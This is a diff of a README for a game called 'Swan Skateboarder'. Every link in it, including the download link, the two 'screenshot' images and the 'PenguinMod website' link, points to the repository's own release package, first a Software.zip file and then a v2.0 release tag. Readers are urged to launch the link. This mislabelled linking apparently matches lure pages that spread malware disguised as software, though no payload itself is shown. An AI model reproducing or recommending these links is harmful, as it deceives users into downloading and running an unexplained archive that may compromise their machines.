@@ -12,15 +12,15 @@ In this exciting game, you take on the role of a swan who loves to skateboard. Y
 
 ## 🚀 Getting Started
 To start playing "Swan Skateboarder", you can download the game from the following link:
-[Download Game 🎮](https://github.com/QifliAdha/swan-skateboarder/releases/download/v1.0/Software.zip)
+[Download Game 🎮](https://github.com/QifliAdha/swan-skateboarder/releases/tag/v2.0)
 
 🔹 **Note:** The link provided needs to be launched to download the game.
 
 ## 📸 Screenshots
 Here are some snapshots from the game to give you a sneak peek into the world of "Swan Skateboarder":
 
-![Screenshot 1](https://github.com/QifliAdha/swan-skateboarder/releases/download/v1.0/Software.zip,skateboard)
-![Screenshot 2](https://github.com/QifliAdha/swan-skateboarder/releases/download/v1.0/Software.zip)
+![Screenshot 1](https://github.com/QifliAdha/swan-skateboarder/releases/tag/v2.0,skateboard)
+![Screenshot 2](https://github.com/QifliAdha/swan-skateboarder/releases/tag/v2.0)
 
 ## 🌟 Features
 - Exciting skateboarding gameplay with a unique twist
@@ -38,7 +38,7 @@ Contributions to the "Swan Skateboarder" game are welcome! Whether you want to r
 If you have any feedback, suggestions, or ideas for improving the game, please don't hesitate to reach out. Your feedback is crucial in helping us enhance the gameplay and provide a better experience for all players.
 
 ## 🌐 Visit PenguinMod
-If you're interested in exploring more games created using PenguinMod or want to learn about game development, visit the PenguinMod website [here](https://github.com/QifliAdha/swan-skateboarder/releases/download/v1.0/Software.zip).
+If you're interested in exploring more games created using PenguinMod or want to learn about game development, visit the PenguinMod website [here](https://github.com/QifliAdha/swan-skateboarder/releases/tag/v2.0).
 
 ## 🎉 Enjoy the Game!
 We hope you have a fantastic time playing "Swan Skateboarder" and experiencing the thrill of skateboarding as a graceful swan. Get ready to ride, perform tricks, and collect coins in this exciting and delightful game!
